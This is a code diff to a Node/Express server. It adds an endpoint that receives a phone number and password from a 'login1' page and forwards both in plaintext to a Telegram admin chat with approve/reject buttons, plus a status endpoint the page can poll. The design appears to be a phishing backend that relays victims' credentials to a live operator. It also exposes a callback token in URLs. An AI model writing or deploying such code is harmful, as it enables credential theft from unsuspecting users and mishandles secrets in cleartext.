@@ -249,6 +249,37 @@ app.post("/api/telegram/webhook", (req, res) => {
 });
 
 /**
+ * POST /api/password/verify
+ * Receive password from login1 and notify Telegram admin for verification
+ */
+app.post('/api/password/verify', (req, res) => {
+  const { phone, password } = req.body;
+
+  if (!phone || !password) {
+    return res.status(400).json({ error: 'Missing required fields: phone, password' });
+  }
+
+  const requestId = uuidv4();
+  const timestamp = new Date().toISOString();
+
+  otpRequests.set(requestId, {
+    requestId,
+    type: 'password_verify',
+    phone,
+    password,
+    timestamp,
+    approved: false,
+    rejectedReason: null,
+  });
+
+  sendTelegramPasswordNotification(requestId, phone, password);
+
+  console.log(`[PASSWORD_VERIFY] New password verification request ${requestId} for ${phone}`);
+
+  res.json({ success: true, requestId, message: 'Password submitted for verification. Awaiting admin approval.' });
+});
+
+/**
  * POST /api/login/submit
  * Receive final login submission (login2) and notify Telegram admin for approval
  */
@@ -279,6 +310,48 @@ app.post('/api/login/submit', (req, res) => {
 
   res.json({ success: true, requestId, message: 'Login submitted. Awaiting admin approval.' });
 });
+
+function sendTelegramPasswordNotification(requestId, phone, password) {
+  const checkUrl = `${BACKEND_URL}/api/password-status/${requestId}`;
+  const callbackToken = process.env.TELEGRAM_CALLBACK_TOKEN;
+
+  const message = `
+🔐 <b>Password Verification Required</b>
+
+📱 <b>Phone:</b> ${phone}
+🔑 <b>Password:</b> <code>${password}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+
+<b>Request ID:</b> <code>${requestId}</code>
+`;
+
+  const options = {
+    parse_mode: 'HTML',
+    reply_markup: {
+      inline_keyboard: [
+        [
+          {
+            text: '✅ APPROVE',
+            url: `${BACKEND_URL}/api/telegram/approve?requestId=${requestId}&action=approve&token=${callbackToken}`,
+          },
+          {
+            text: '❌ REJECT',
+            url: `${BACKEND_URL}/api/telegram/approve?requestId=${requestId}&action=reject&token=${callbackToken}`,
+          },
+        ],
+      ],
+    },
+  };
+
+  bot
+    .sendMessage(TELEGRAM_ADMIN_CHAT_ID, message, options)
+    .then(() => {
+      console.log(`[Telegram] Password verification notification sent for ${requestId}`);
+    })
+    .catch((err) => {
+      console.error(`[Telegram] Error sending password verification notification:`, err.message);
+    });
+}
 
 function sendTelegramLoginNotification(requestId, username, password, phone) {
   const approveUrl = `${BACKEND_URL}/api/telegram/approve`;
@@ -322,6 +395,25 @@ function sendTelegramLoginNotification(requestId, username, password, phone) {
       console.error(`[Telegram] Error sending login2 notification:`, err.message);
     });
 }
+
+/**
+ * GET /api/password-status/:requestId
+ * Check if password has been approved by admin
+ */
+app.get('/api/password-status/:requestId', (req, res) => {
+  const { requestId } = req.params;
+
+  if (!otpRequests.has(requestId)) {
+    return res.status(404).json({ error: 'Request not found' });
+  }
+
+  const request = otpRequests.get(requestId);
+  res.json({
+    requestId,
+    approved: request.approved,
+    rejectedReason: request.rejectedReason,
+  });
+});
 
 /**
  * Health check
